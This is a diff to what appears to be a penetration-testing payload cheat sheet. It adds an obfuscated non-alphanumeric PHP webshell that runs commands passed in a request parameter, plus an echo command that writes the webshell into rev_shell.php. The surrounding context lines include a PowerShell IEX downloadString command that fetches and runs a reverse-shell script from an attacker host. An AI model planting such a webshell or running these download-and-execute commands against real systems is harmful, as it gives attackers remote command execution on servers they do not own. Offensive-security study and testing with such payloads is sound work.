@@ -33,6 +33,7 @@
 - [msfvenom](#msfvenom)
 - [Netcat Reverse Shell](#netcat-reverse-shell)
 - [Nishang](#nishang)
+- [Non-alphanumeric Webshell](#non-alphanumeric-webshell)
 - [ntlm_theft](#ntml_theft)
 - [PDF](#pdf)
 - [Perl Reverse Shell](#perl-reverse-shell)
@@ -720,6 +721,18 @@ Invoke-PowerShellTcp -Reverse -IPAddress <LHOST> -Port <LPORT>
 
 ```c
 C:\> powershell "IEX(New-Object Net.Webclient).downloadString('http://<LHOST>:<LPORT>/Invoke-PowerShellTcp.ps1')"
+```
+
+## Non-alphanumeric Webshell
+
+> https://gist.github.com/0xSojalSec/5bee09c7035985ddc13fddb16f191075
+
+```c
+<?=`{${~"\xa0\xb8\xba\xab"}["\xa0"]}`;
+```
+
+```c
+$ echo -ne '<?=`{${~\xa0\xb8\xba\xab}[\xa0]}`;' > rev_shell.php
 ```
 
 ## ntml_theft
